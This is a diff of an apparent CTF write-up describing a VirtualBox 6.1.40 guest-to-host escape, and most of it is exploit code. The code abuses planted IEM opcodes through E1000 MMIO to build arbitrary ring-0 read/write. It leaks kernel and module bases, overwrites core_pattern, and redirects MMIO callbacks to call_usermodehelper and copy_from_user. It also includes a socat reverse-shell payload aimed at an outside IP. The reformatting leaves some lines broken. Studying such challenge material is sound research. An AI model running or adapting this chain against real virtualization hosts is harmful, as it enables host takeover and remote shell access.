@@ -73,11 +73,6 @@
 66
 67
 68
-```
-
-
-
-```
 diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h Chall/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h
 --- VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h	2022-10-11 21:51:54.000000000 +0800
 +++ Chall/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h	2022-11-02 19:18:19.196674293 +0800
@@ -93,7 +88,7 @@ diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h Chall/
 @@ -538,6 +538,40 @@
  return IEMOP_RAISE_INVALID_OPCODE();
  }
- 
+
 +FNIEMOP_DEF(iemOp_ReadTable)
 +{
 + if (pVCpu->iem.s.enmCpuMode == IEMMODE_64BIT && pVCpu->iem.s.uCpl == 0 )
@@ -128,7 +123,7 @@ diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h Chall/
 +	return IEMOP_RAISE_INVALID_OPCODE();
 +}
 +
- 
+
  /** Invalid with RM byte . */
  FNIEMOPRM_DEF(iemOp_InvalidWithRM)
 diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h Chall/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h
@@ -146,21 +141,11 @@ diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp
  /* 0x28 */ iemOp_movaps_Vps_Wps, iemOp_movapd_Vpd_Wpd, iemOp_InvalidNeedRM, iemOp_InvalidNeedRM,
  /* 0x29 */ iemOp_movaps_Wps_Vps, iemOp_movapd_Wpd_Vpd, iemOp_InvalidNeedRM, iemOp_InvalidNeedRM,
  /* 0x2a */ iemOp_cvtpi2ps_Vps_Qpi, iemOp_cvtpi2pd_Vpd_Qpi, iemOp_cvtsi2ss_Vss_Ey, iemOp_cvtsi2sd_Vsd_Ey,
-```
-
-
-
-```
 hmR0VmxExitEptMisconfig
  -> PGMR0Trap0eHandlerNPMisconfig
  -> iomMmioPfHandlerNew
  -> iomMmioCommonPfHandlerNew
  -> IEMExecOne ( Reach IEM )
-```
-
-
-
-```
 cat /proc/iomem
 ...............
 ...............
@@ -173,29 +158,14 @@ cat /proc/iomem
  fe000000-fe7fffff : vmwgfx probe
 ...............
 ...............
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
-#define E1000_MMIO_BASE 0xfd5c0000
+    #define E1000_MMIO_BASE 0xfd5c0000
 
 int* addr = ioremap(E1000_MMIO_BASE,0x1000);
 addr[0] = 0x41414141; // write to MMIO
-```
-
-
-
-```
 1
 2
 3
@@ -205,25 +175,15 @@ addr[0] = 0x41414141; // write to MMIO
 7
 8
 9
-```
-
-
-
-```
-#define E1000_CTRL 0x00000	/* Device Control - RW */
-#define E1000_CTRL_DUP 0x00004	/* Device Control Duplicate (Shadow) - RW */
-#define E1000_STATUS 0x00008	/* Device Status - RO */
-#define E1000_EECD 0x00010	/* EEPROM/Flash Control - RW */
-#define E1000_EERD 0x00014	/* EEPROM Read - RW */
-#define E1000_CTRL_EXT 0x00018	/* Extended Device Control - RW */
-#define E1000_FLA 0x0001C	/* Flash Access - RW */
-#define E1000_MDIC 0x00020	/* MDI Control - RW */
+    #define E1000_CTRL 0x00000	/* Device Control - RW */
+    #define E1000_CTRL_DUP 0x00004	/* Device Control Duplicate (Shadow) - RW */
+    #define E1000_STATUS 0x00008	/* Device Status - RO */
+    #define E1000_EECD 0x00010	/* EEPROM/Flash Control - RW */
+    #define E1000_EERD 0x00014	/* EEPROM Read - RW */
+    #define E1000_CTRL_EXT 0x00018	/* Extended Device Control - RW */
+    #define E1000_FLA 0x0001C	/* Flash Access - RW */
+    #define E1000_MDIC 0x00020	/* MDI Control - RW */
 ....................
-```
-
-
-
-```
 1
 2
 3
@@ -259,11 +219,6 @@ addr[0] = 0x41414141; // write to MMIO
 33
 34
 35
-```
-
-
-
-```
 /**
  * Register map table.
  *
@@ -299,19 +254,9 @@ static const struct E1kRegMap_st
  { 0x0001c, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadUnimplemented, e1kRegWriteUnimplemented, "FLA" , "Flash Access (N/A)" },
  { 0x00020, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadDefault , e1kRegWriteMDIC , "MDIC" , "MDI Control" },
  .............................................................
-```
-
-
-
-```
 /* offset size read mask write mask read callback write callback abbrev full name */
 /*------- ------- ---------- ---------- ----------------------- ------------------------ ---------- ------------------------------*/
 { 0x05820, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadDefault , e1kRegWriteDefault , "MANC" , "Management Control" },
-```
-
-
-
-```
 1
 2
 3
@@ -351,11 +296,6 @@ static const struct E1kRegMap_st
 37
 38
 39
-```
-
-
-
-```
 static int drv_open(struct inode *inode, struct file *filp);
 static ssize_t drv_read(struct file *file, char __user *buf,size_t count, loff_t *ppos);
 
@@ -377,27 +317,22 @@ static struct miscdevice pwn_miscdev = {
 
 static ssize_t drv_read(struct file *file, char __user *buf,
  size_t count, loff_t *ppos) {
- 
+
  /* We put our exploit here */
  printk(KERN_INFO "In drv_read\n");
  return 0;
 }
 
-int init_module(void) { 
- return misc_register(&pwn_miscdev); 
- 
-} 
- 
-void cleanup_module(void) { 
-	misc_deregister(&pwn_miscdev); 
-} 
- 
+int init_module(void) {
+ return misc_register(&pwn_miscdev);
+
+}
+
+void cleanup_module(void) {
+	misc_deregister(&pwn_miscdev);
+}
+
 MODULE_LICENSE("GPL");
-```
-
-
-
-```
 1
 2
 3
@@ -407,13 +342,8 @@ MODULE_LICENSE("GPL");
 7
 8
 9
-```
-
-
-
-```
-#include <unistd.h>
-#include <stdlib.h>
+    #include 
+    #include <stdlib.h>
 
 char buf[0x100];
 int main(){
@@ -421,26 +351,16 @@ int main(){
  int fd = open("/dev/pwn",2);
  read(fd,buf,1); // trigger drv_read
 }
-```
+obj-m += test.o
+CFLAGS_test.o := -masm=intel -w
+PWD := $(CURDIR)
 
-
-
-```
-obj-m += test.o 
-CFLAGS_test.o := -masm=intel -w 
-PWD := $(CURDIR) 
- 
-all: 
+all:
  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
- gcc exp.c -w --static -o exp	
- 
-clean: 
+ gcc exp.c -w --static -o exp
+
+clean:
  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-```
-
-
-
-```
 1
 2
 3
@@ -458,32 +378,22 @@ clean:
 15
 16
 17
-```
-
-
-
-```
-#define E1000_MMIO_BASE 0xf0000000
-#define RT 0x0000250f // iemOp_ReadTable
-#define WT 0x0000270f // iemOp_WriteTable
+    #define E1000_MMIO_BASE 0xf0000000
+    #define RT 0x0000250f // iemOp_ReadTable
+    #define WT 0x0000270f // iemOp_WriteTable
 
 static ssize_t drv_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
- 
+
  /* We put our exploit here */
- 
+
  printk(KERN_INFO "In drv_read\n");
 
  /* E1000_MANC: E1000_MMIO_BASE + 0x5820 */
  int* inst = ioremap(E1000_MMIO_BASE + 0x5000, 0x1000);
  inst[0x820/4] = RT; // iemOp_ReadTable
- 
+
  return 0;
 }
-```
-
-
-
-```
 1
 2
 3
@@ -520,14 +430,9 @@ static ssize_t drv_read(struct file *file, char __user *buf, size_t count, loff_
 34
 35
 36
-```
-
-
-
-```
 static size_t *to_page_entry(size_t cr3, size_t addr) {
  /* Get the PTE of addr */
- 
+
  size_t idx, i;
  size_t val = cr3;
  for (i = 0; i < 4; i++) {
@@ -558,68 +463,33 @@ static ssize_t drv_read(struct file *file, char __user *buf,
  size_t *ent = to_page_entry(cr3, (size_t)code); // [2]
  size_t *B = to_page_entry(cr3, (size_t)drv_read); // [3]
  *ent = (E1000_MMIO_BASE + 0x5000) | ((*B) & 0xff00000000000fffULL); // [4]
- 
+
  // .......omitted....................
 }
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 asm volatile(
  "mov rbx,0x41414141\r\n;" // the Table index
- "mov rcx,%[code]\r\n;" // code+0x820, which will ended up in E1000_MMIO_BASE + 0x5000 + 0x820 == E1000_MANC 
+ "mov rcx,%[code]\r\n;" // code+0x820, which will ended up in E1000_MMIO_BASE + 0x5000 + 0x820 == E1000_MANC
  "call rcx\r\n;" ::[code] "r"(code + 0x820) : "rax", "rbx", "rcx"
 );
-```
-
-
-
-```
 1
-```
-
-
-
-```
 inst[0x820/4] = WT;
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 asm volatile(
  "mov rbx,0x100\r\n;" // index
  "mov rax, 0x4141414141414141\r\n;" // write 0x4141414141414141
  "mov rcx,%[code]\r\n;"
  "call rcx\r\n;" ::[code] "r"(code + 0x820) : "rax", "rbx", "rcx"
 );
-```
-
-
-
-```
 1
 2
 3
@@ -686,21 +556,16 @@ asm volatile(
 64
 65
 66
-```
+    #define E1000_MMIO_BASE 0xf0000000
+    #define RT 0x00c3250f
+    #define WT 0x00c3270f
 
-
-
-```
-#define E1000_MMIO_BASE 0xf0000000
-#define RT 0x00c3250f
-#define WT 0x00c3270f
-
-#define sll signed long long
+    #define sll signed long long
 
 static size_t __attribute__((optimize("O0"))) read_table(int *inst, char *code, sll idx) {
- 
+
  /* iemOp_ReadTable */
- 
+
  inst[0x820/4] = RT;
  size_t ret;
  asm volatile(
@@ -716,9 +581,9 @@ static size_t __attribute__((optimize("O0"))) read_table(int *inst, char *code, 
 }
 
 static void __attribute__((optimize("O0"))) write_table(int *inst, char *code, sll idx, size_t val) {
- 
+
  /* iemOp_WriteTable */
- 
+
  inst[0x820/4] = WT;
  asm volatile(
  "mov rbx,%[idx]\r\n;"
@@ -734,7 +599,7 @@ static void __attribute__((optimize("O0"))) write_table(int *inst, char *code, s
 static ssize_t drv_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
 
  printk(KERN_INFO "In drv_read\n");
- 
+
  /* E1000_MANC: E1000_MMIO_BASE + 0x5820 */
  int* inst = ioremap(E1000_MMIO_BASE+0x5000,0x1000);
 
@@ -744,44 +609,29 @@ static ssize_t drv_read(struct file *file, char __user *buf, size_t count, loff_
  "mov %[val],cr3\r\n;"
  :[val]"=r"(cr3)::
  );
- 
+
  /* Modify code's PTE so code points to E1000_MMIO_BASE+0x5000 */
  size_t* ent = to_page_entry(cr3,(size_t)code);
  size_t* B = to_page_entry(cr3,(size_t)drv_read);
- *ent = (E1000_MMIO_BASE+0x5000) | ( (*B)&0xff00000000000fffULL); 
+ *ent = (E1000_MMIO_BASE+0x5000) | ( (*B)&0xff00000000000fffULL);
  // Do read/write table
  sll idx = <some index>;
  size_t val = <some value>;
  write_table(inst, code, idx, val);
  read_table(inst, code, idx);
- 
+
  return 0;
 }
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 // leak VMMR0.r0's base
 sll off_table = 0x1FC060; // table's offset in VMMR0.r0
 sll off_iemAImpl_mul_u8 = 0x1dacd0; // iemAImpl_mul_u8's got in VMMR0.r0
 size_t vmmr0_base = read_table(inst, code, (off_iemAImpl_mul_u8 - off_table)>>3 ) - 0x11a6a8;
 printk(KERN_INFO "vmmr0_base: %px\n", vmmr0_base);
-```
-
-
-
-```
 1
 2
 3
@@ -803,24 +653,19 @@ printk(KERN_INFO "vmmr0_base: %px\n", vmmr0_base);
 19
 20
 21
-```
-
-
-
-```
 sll table;
 
 static size_t __attribute__((optimize("O0"))) arb_read(int *inst, char *code, sll addr) {
- 
+
  /* arbitrary read */
- 
+
  return read_table( inst, code, (addr - table)>>3 );
 }
 
 static void __attribute__((optimize("O0"))) arb_write(int *inst, char *code, sll addr, size_t val) {
- 
+
  /* arbitrary write */
- 
+
  return write_table( inst, code, (addr - table)>>3, val );
 }
 
@@ -829,27 +674,12 @@ table = vmmr0_base + off_table;
 addr = <some kernel address>;
 arb_read(inst, code, addr);
 arb_write(inst, code, addr, val);
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 size_t got_SUPR0EnableVTx = vmmr0_base + 0x1DB018; // SUPR0EnableVTx@got.plt
 size_t vboxdrv_base = arb_read(inst, code, (sll)got_SUPR0EnableVTx) - 0x8a0;
 printk(KERN_INFO "vboxdrv_base: %px\n", vboxdrv_base);
-```
-
-
-
-```
 1
 2
 3
@@ -859,11 +689,6 @@ printk(KERN_INFO "vboxdrv_base: %px\n", vboxdrv_base);
 7
 8
 9
-```
-
-
-
-```
 // read the 4 byte offset
 size_t tmp = arb_read(inst, code, (sll)(vboxdrv_base+0x15a8a+1));
 tmp = (tmp >> 24)&0xffffffff; // tmp = 4 byte offset
@@ -873,11 +698,6 @@ printk(KERN_INFO "kfree_offset: %d\n", kfree_offset);
 // calculate kernel base
 size_t kernel_base = vboxdrv_base + 0x15a8a + 5 + kfree_offset - 0x2a2af0;
 printk(KERN_INFO "kernel_base: %px\n", kernel_base);
-```
-
-
-
-```
 1
 2
 3
@@ -897,13 +717,8 @@ printk(KERN_INFO "kernel_base: %px\n", kernel_base);
 17
 18
 19
-```
-
-
-
-```
 static void __attribute__((optimize("O0"))) write_string(int *inst, char *code, sll addr, char* string) {
- int i = 0, cnt = 0, written = 0; 
+ int i = 0, cnt = 0, written = 0;
  size_t val = 0;
  int sz = strlen(string);
  for (i = 0 ; i < sz+1 ; i++) { // to strlen(data)+1 so null byte will be written as well
@@ -921,25 +736,10 @@ static void __attribute__((optimize("O0"))) write_string(int *inst, char *code, 
  arb_write(inst, code, (sll)(addr + (cnt*8)), val);
  }
 }
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
-size_t core_pattern = kernel_base + 0x17770c0; 
+size_t core_pattern = kernel_base + 0x17770c0;
 write_string(inst, code, (sll)core_pattern, "|/usr/bin/touch /tmp/123");
-```
-
-
-
-```
 1
 2
 3
@@ -958,11 +758,6 @@ write_string(inst, code, (sll)core_pattern, "|/usr/bin/touch /tmp/123");
 16
 17
 18
-```
-
-
-
-```
 // vboxhost/vboxdrv/SUPDrvGip.c
 /**
  * Maps the GIP into userspace and/or get the physical address of the GIP.
@@ -981,11 +776,6 @@ SUPR0DECL(int) SUPR0GipMap(PSUPDRVSESSION pSession, PRTR3PTR ppGipR3, PRTHCPHYS 
  rc = RTR0MemObjMapUser(&pSession->GipMapObjR3, pDevExt->GipMemObj, (RTR3PTR)-1, 0, RTMEM_PROT_READ, NIL_RTR0PROCESS);
  // ...............omitted............................
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1050,11 +840,6 @@ SUPR0DECL(int) SUPR0GipMap(PSUPDRVSESSION pSession, PRTR3PTR ppGipR3, PRTHCPHYS 
 62
 63
 64
-```
-
-
-
-```
 // src/VBox/VMM/VMMR0/IOMR0Mmio.cpp
 /**
  * Grows the MMIO registration (all contexts) and lookup tables.
@@ -1067,7 +852,7 @@ SUPR0DECL(int) SUPR0GipMap(PSUPDRVSESSION pSession, PRTR3PTR ppGipR3, PRTHCPHYS 
  */
 VMMR0_INT_DECL(int) IOMR0MmioGrowRegistrationTables(PGVM pGVM, uint64_t cReqMinEntries)
 {
- 
+
  // ...............omitted.....................
  /*
  * Allocate the new tables. We use a single allocation for the three tables (ring-0,
@@ -1119,11 +904,6 @@ VMMR0_INT_DECL(int) IOMR0MmioGrowRegistrationTables(PGVM pGVM, uint64_t cReqMinE
 
  return rc;
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1154,11 +934,6 @@ VMMR0_INT_DECL(int) IOMR0MmioGrowRegistrationTables(PGVM pGVM, uint64_t cReqMinE
 28
 29
 30
-```
-
-
-
-```
 // src/VBox/VMM/VMMR0/GVMMR0.cpp
 
 static PGVMM g_pGVMM = NULL;
@@ -1188,11 +963,6 @@ typedef struct GVMHANDLE
  PGVM pGVM;
  //...............omitted.........................
 } GVMHANDLE;
-```
-
-
-
-```
 1
 2
 3
@@ -1204,11 +974,6 @@ typedef struct GVMHANDLE
 9
 10
 11
-```
-
-
-
-```
 size_t g_pGVMM = arb_read(inst, code, (sll)(vmmr0_base + 0x1E9E68));
 printk(KERN_INFO "g_pGVMM: %px\n", g_pGVMM);
 
@@ -1220,23 +985,8 @@ size_t r0Map = arb_read(inst, code, (sll)(pGVM + 65352)); // paRing3
 size_t r3Map = arb_read(inst, code, (sll)(pGVM + 44152)); // uAddrRing3
 printk(KERN_INFO "r0Map: %px\n", r0Map);
 printk(KERN_INFO "r3Map: %px\n", r3Map);
-```
-
-
-
-```
 1
-```
-
-
-
-```
 PIOMMMIOENTRYR3 const paRing3
-```
-
-
-
-```
 1
 2
 3
@@ -1268,11 +1018,6 @@ PIOMMMIOENTRYR3 const paRing3
 29
 30
 31
-```
-
-
-
-```
 // src/VBox/VMM/include/IOMInternal.h
 
 /**
@@ -1304,11 +1049,6 @@ typedef struct IOMMMIOENTRYR3
 } IOMMMIOENTRYR3;
 /** Pointer to a ring-3 MMIO handle table entry. */
 typedef IOMMMIOENTRYR3 *PIOMMMIOENTRYR3;
-```
-
-
-
-```
 1
 2
 3
@@ -1325,11 +1065,6 @@ typedef IOMMMIOENTRYR3 *PIOMMMIOENTRYR3;
 14
 15
 16
-```
-
-
-
-```
 /*
  * According to debugger, there are 5 entries in the table
  * Each entry represent a device
@@ -1345,11 +1080,6 @@ for (i = 0 ; i < 5 ; i++) {
  arb_write(inst, code, (sll)(r0Map + write_cb_off), 0x1234);
  arb_write(inst, code, (sll)(r0Map + read_cb_off), 0x1234);
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1375,11 +1105,6 @@ for (i = 0 ; i < 5 ; i++) {
 23
 24
 25
-```
-
-
-
-```
 // src/VBox/Devices/Network/DevE1000.cpp
 
 /**
@@ -1397,57 +1122,29 @@ for (i = 0 ; i < 5 ; i++) {
 static int e1kRegWriteEECD(PPDMDEVINS pDevIns, PE1KSTATE pThis, uint32_t offset, uint32_t index, uint32_t value)
 {
  RT_NOREF(pDevIns, offset, index);
-#ifdef IN_RING3
- //...............omitted......................... 
+    #ifdef IN_RING3
+ //...............omitted.........................
  return VINF_SUCCESS;
-#else /* !IN_RING3 */
+    #else /* !IN_RING3 */
  RT_NOREF(pThis, value);
  return VINF_IOM_R3_MMIO_WRITE; // <-- HERE
-#endif /* !IN_RING3 */
+    #endif /* !IN_RING3 */
 }
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 // trigger crash
 // this is a R3 MMIO write ( return VINF_IOM_R3_MMIO_WRITE; in e1kRegReadEECD )
 int* inst2 = ioremap(E1000_MMIO_BASE,0x1000);
 inst2[0x10/4] = 0; // E1000_EECD = E1000_MMIO_BASE + 0x10
-```
-
-
-
-```
-|/usr/bin/socat exec:'bash',pty,stderr,setsid,sigint,sane tcp:192.168.72.130:44444
-```
-
-
-
-```
+|/usr/bin/socat exec:'bash',pty,stderr,setsid,sigint,sane tcp:
+192.168.72.130:
+44444
 1
 2
-```
-
-
-
-```
 PIOMMMIOENTRYR0 const paRing0 = (PIOMMMIOENTRYR0)RTR0MemObjAddress(hMemObj);
 PIOMMMIOENTRYR3 const paRing3 = (PIOMMMIOENTRYR3)((uintptr_t)paRing0 + cbRing0);
-```
-
-
-
-```
 1
 2
 3
@@ -1478,11 +1175,6 @@ PIOMMMIOENTRYR3 const paRing3 = (PIOMMMIOENTRYR3)((uintptr_t)paRing0 + cbRing0);
 28
 29
 30
-```
-
-
-
-```
 // src/VBox/VMM/include/IOMInternal.h
 
 /**
@@ -1513,43 +1205,18 @@ typedef struct IOMMMIOENTRYR0
 } IOMMMIOENTRYR0;
 /** Pointer to a ring-0 MMIO handle table entry. */
 typedef IOMMMIOENTRYR0 *PIOMMMIOENTRYR0;
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 // src/VBox/VMM/VMMAll/IOMAllMmioNew.cpp
 // In function iomMmioDoWrite()
 pfnWriteCallback(pDevIns, pvUser, !(fFlags & IOMMMIO_FLAGS_ABS) ? offRegion : GCPhys, ......);
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
-#define IOAPIC_BASE 0xfec00000
+    #define IOAPIC_BASE 0xfec00000
 uint8_t* inst2 = ioremap(IOAPIC_BASE, 0x1000);
 inst2[0] = 0; // ring-0 MMIO write
-```
-
-
-
-```
 1
 2
 3
@@ -1558,11 +1225,6 @@ inst2[0] = 0; // ring-0 MMIO write
 6
 7
 8
-```
-
-
-
-```
 // src/VBox/VMM/VMMAll/IOMAllMmioNew.cpp
 // In function iomMmioHandlerNew
 
@@ -1571,23 +1233,8 @@ if (rcStrict == VINF_SUCCESS)
 {
  // .....omitted..................
  iomMmioDoWrite(pVM, pVCpu, pRegEntry, GCPhysFault, .....);
-```
-
-
-
-```
 1
-```
-
-
-
-```
 int call_usermodehelper(const char *path, char **argv, char **envp, int wait);
-```
-
-
-
-```
 1
 2
 3
@@ -1619,11 +1266,6 @@ int call_usermodehelper(const char *path, char **argv, char **envp, int wait);
 29
 30
 31
-```
-
-
-
-```
 // leak pGVM->iomr0.s.paMmioRegs (paRing0)
 size_t paRing0 = arb_read(inst, code, (sll)(pGVM + 65336)); // g_pGVMM->aHandles[1]->pGVM->iomr0.s.paMmioRegs
 printk(KERN_INFO "paRing0: %px\n", paRing0);
@@ -1655,23 +1297,8 @@ arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x18), call_usermodehelper); // Dev
 // which will now be call_usermodehelper("/bin/bash", argv, 0, <some pointer>). <some pointer> will not affect call_usermodehelper
 uint8_t* inst2 = ioremap(IOAPIC_BASE, 0x1000);
 inst2[0] = 0;
-```
-
-
-
-```
 1
-```
-
-
-
-```
-_copy_from_user(/*<kernel address for dst>*/, /*<user address for src>*/, size);
-```
-
-
-
-```
+_copy_from_user(/*<kernel address for dst>*/, /**/, size);
 1
 2
 3
@@ -1692,11 +1319,6 @@ _copy_from_user(/*<kernel address for dst>*/, /*<user address for src>*/, size);
 18
 19
 20
-```
-
-
-
-```
 // Get the address of IO APIC's pDevIns
 size_t r0pDevIns = arb_read(inst, code, (sll)(paRing0 + 0x38 + 0x10)); // DeviceIOAPIC->pDevIns
 // Overwrite DeviceIOAPIC->pfnWriteCallback into copy_from_user
@@ -1717,29 +1339,14 @@ static size_t __attribute__((optimize("O0"))) arb_read64_user(int *inst, char *c
  // Content will be copied into r0pDevIns, read it
  return arb_read(inst, code, (sll)(r0pDevIns));
 }
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 size_t e1kMMIORead = arb_read(inst, code, (sll)(r0Map + 0x188)); // e1kMMIORead
 size_t vboxdd_base = e1kMMIORead - 0xff970;
 size_t got_ioctl = vboxdd_base + 0x211bf0; // ioctl@got.plt
 size_t ioctl = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, got_ioctl);
-```
-
-
-
-```
 1
 2
 3
@@ -1804,11 +1411,6 @@ size_t ioctl = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, got_ioctl)
 62
 63
 64
-```
-
-
-
-```
 // get libc base
 size_t libc_base = 0;
 size_t cur_addr = ioctl & ~0xfff;
@@ -1846,10 +1448,10 @@ while(true) {
  }
  if (type == 5) { // STRTAB
  libc_strtab = vaddr;
- } 
+ }
  if (type == 6) { // SYMTAB
  libc_symtab = vaddr;
- } 
+ }
  cur_addr += 0x10;
 }
 // scan for system
@@ -1873,11 +1475,6 @@ printk(KERN_INFO "libc_dynamic: %px\n", libc_dynamic);
 printk(KERN_INFO "libc_strtab: %px\n", libc_strtab);
 printk(KERN_INFO "libc_symtab: %px\n", libc_symtab);
 printk(KERN_INFO "system: %px\n", system);
-```
-
-
-
-```
 1
 2
 3
@@ -1895,11 +1492,6 @@ printk(KERN_INFO "system: %px\n", system);
 15
 16
 17
-```
-
-
-
-```
 // leak ring 3 DeviceE1000->pDevIns->pCritSectRoR3
 size_t r3pDevIns = arb_read(inst, code, (sll)(r0Map + 0x178)); // ring 3 DeviceE1000->pDevIns
 size_t pCritSectRoR3 = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, r3pDevIns + 0x28);
